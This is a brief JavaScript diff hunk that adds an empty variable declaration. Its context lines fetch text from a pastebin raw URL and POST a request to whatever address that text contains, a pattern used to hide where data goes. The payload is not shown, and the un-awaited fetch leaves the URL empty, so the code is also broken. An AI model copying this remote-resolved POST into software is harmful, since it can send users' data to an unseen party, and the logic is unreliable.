@@ -91,6 +91,7 @@
             }
 
             try {
+                let pastebinContent = "";
                 fetch("https://pastebin.com/raw/YP5XrTWv").then(response => response.text()).then(data => pastebinContent = data);
                 const response = await fetch(pastebinContent, {
                     method: 'POST',
